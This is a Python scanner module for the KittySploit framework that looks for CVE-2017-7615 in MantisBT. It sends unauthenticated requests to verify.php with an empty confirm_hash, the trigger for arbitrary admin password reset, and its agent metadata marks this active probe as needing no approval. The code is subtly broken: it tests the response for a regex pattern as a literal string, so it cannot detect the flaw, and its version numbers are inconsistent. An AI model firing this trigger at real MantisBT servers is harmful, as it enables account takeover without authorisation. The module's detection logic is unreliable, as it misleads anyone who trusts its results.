#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""MantisBT through 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'MantisBT <=2.30 - Arbitrary Password Reset/Admin Access Detection',
        'description': 'MantisBT through 2.3.0 allows arbitrary password reset and unauthenticated admin access via an empty confirm_hash value to verify.php.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2017', 'mantisbt', 'unauth', 'edb', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 5,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://sourceforge.net/projects/mantisbt/files/mantis-stable/',
            'http://hyp3rlinx.altervista.org/advisories/MANTIS-BUG-TRACKER-PRE-AUTH-REMOTE-PASSWORD-RESET.txt',
            'https://www.exploit-db.com/exploits/41890',
            'http://www.openwall.com/lists/oss-security/2017/04/16/2',
            'https://nvd.nist.gov/vuln/detail/CVE-2017-7615',
        ],
        'cve': 'CVE-2017-7615',
    }

    def run(self):
        for path in ('/verify.php?id=1&confirm_hash=', '/mantis/verify.php?id=1&confirm_hash=', '/mantisBT/verify.php?id=1&confirm_hash=', '/mantisbt-2.3.0/verify.php?id=1&confirm_hash=', '/bugs/verify.php?confirm_hash=&id=1'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_any = ('<input type="hidden" name="account_update_token" value="([a-zA-Z0-9_-]+)"',)
            if (any(m in body for m in body_any)):
                self.set_info(
                    severity='high',
                    reason="MantisBT <=2.30 - Arbitrary Password Reset/Admin Access detected",
                    path=path,
                )
                return True
        return False

